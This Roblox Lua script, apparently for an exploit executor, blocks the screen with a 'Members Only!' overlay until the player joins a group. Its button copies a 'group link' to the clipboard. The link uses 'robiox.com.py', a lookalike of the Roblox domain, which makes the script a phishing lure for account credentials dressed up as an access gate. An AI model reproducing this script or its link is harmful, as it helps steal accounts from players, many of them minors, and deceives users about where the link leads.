local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local GROUP_ID = 310789157223
local GROUP_LINK = "https://www.robiox.com.py/communities/310789157223/Scriptstudio"

-- FAST CHECK
local function isMember()
	local ok, result = pcall(function()
		return player:IsInGroup(GROUP_ID)
	end)

	return ok and result
end

if isMember() then
	return
end

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "AccessUI"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = playerGui

local blur = Instance.new("BlurEffect")
blur.Size = 18
blur.Parent = Lighting

local bg = Instance.new("Frame")
bg.Size = UDim2.fromScale(1,1)
bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
bg.BackgroundTransparency = 0.35
bg.BorderSizePixel = 0
bg.Parent = gui

local card = Instance.new("Frame")
card.Size = UDim2.new(0,340,0,290)
card.Position = UDim2.new(.5,-170,.5,-145)
card.BackgroundColor3 = Color3.fromRGB(65,20,160)
card.BorderSizePixel = 0
card.Parent = gui

Instance.new("UICorner", card).CornerRadius = UDim.new(0,18)

local grad = Instance.new("UIGradient")
grad.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(95,30,195)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(40,8,105))
}
grad.Rotation = 135
grad.Parent = card

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(170,90,255)
stroke.Thickness = 1.4
stroke.Parent = card

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,35)
title.Position = UDim2.new(0,0,0,35)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.Text = "Members Only!"
title.TextSize = 24
title.TextColor3 = Color3.new(1,1,1)
title.Parent = card

local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1,-30,0,45)
sub.Position = UDim2.new(0,15,0,75)
sub.BackgroundTransparency = 1
sub.Font = Enum.Font.Gotham
sub.TextWrapped = true
sub.TextSize = 13
sub.TextColor3 = Color3.fromRGB(220,200,255)
sub.Text = "Join the group to unlock access instantly."
sub.Parent = card

local button = Instance.new("TextButton")
button.Size = UDim2.new(.82,0,0,45)
button.Position = UDim2.new(.09,0,1,-65)
button.BackgroundColor3 = Color3.fromRGB(138,43,226)
button.Text = "🔗 Copy Group Link"
button.TextColor3 = Color3.new(1,1,1)
button.Font = Enum.Font.GothamBold
button.TextSize = 15
button.Parent = card

Instance.new("UICorner", button).CornerRadius = UDim.new(0,12)

button.MouseButton1Click:Connect(function()
	if setclipboard then
		setclipboard(GROUP_LINK)
		button.Text = "✓ Copied!"
		task.wait(1.2)
		button.Text = "🔗 Copy Group Link"
	else
		button.Text = "Unsupported"
	end
end)

-- FAST AUTO UNLOCK
task.spawn(function()
	while gui.Parent do
		task.wait(1)

		if isMember() then
			TweenService:Create(card,TweenInfo.new(.25),{
				Size = UDim2.new(0,0,0,0),
				Position = UDim2.new(.5,0,.5,0)
			}):Play()

			TweenService:Create(bg,TweenInfo.new(.25),{
				BackgroundTransparency = 1
			}):Play()

			TweenService:Create(blur,TweenInfo.new(.25),{
				Size = 0
			}):Play()

			task.wait(.3)

			gui:Destroy()
			blur:Destroy()

			break
		end
	end
end)
